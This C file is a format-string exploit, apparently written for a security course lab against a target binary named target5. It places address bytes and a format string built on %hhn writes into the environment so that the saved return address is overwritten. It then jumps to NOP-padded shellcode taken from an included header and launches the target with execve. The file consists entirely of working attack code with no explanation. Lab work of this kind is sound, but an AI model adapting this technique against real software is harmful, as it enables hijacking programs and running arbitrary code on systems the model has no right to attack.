#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
int rip_addr0 = 0x2021fea8;
char rip_addr0_str[] = "\xa8\xfe\x21\x20";

int rip_addr1 = 0x2021fea9;
char rip_addr1_str[] = "\xa9\xfe\x21\x20";

int rip_addr2 = 0x2021feaa;
char rip_addr2_str[] = "\xaa\xfe\x21\x20";

int rip_addr3 = 0x2021feab;
char rip_addr3_str[] = "\xab\xfe\x21\x20";

int main(void)
{
    char exploit_str[256];
    strcpy(exploit_str, shellcode);
    while(strlen(exploit_str) < 256) strcat(exploit_str, NOP);

    char fmt_str[] = "%008x%008x%008x%008x%245x%hhn%229x%hhn%039x%hhn%255x%hhn";

    char *args[3];
    char *env[46];

    args[0] = TARGET;
    args[1] = rip_addr0_str;
    args[2] = NULL;

    for(int i = 0; i <= 10; ++i) env[i] = "\0";
    env[11] = rip_addr1_str;
    for(int i = 12; i <= 22; ++i) env[i] = "\0";
    env[23] = rip_addr2_str;
    for(int i = 24; i <= 34; ++i) env[i] = "\0";
    env[35] = rip_addr3_str;
    for(int i = 36; i <= 42; ++i) env[i] = "\0";
    env[43] = fmt_str; // shell code addr: 0x2021fa15 = formatString[60] + 57, lenth of fmt_str
    env[44] = exploit_str;
    env[45] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
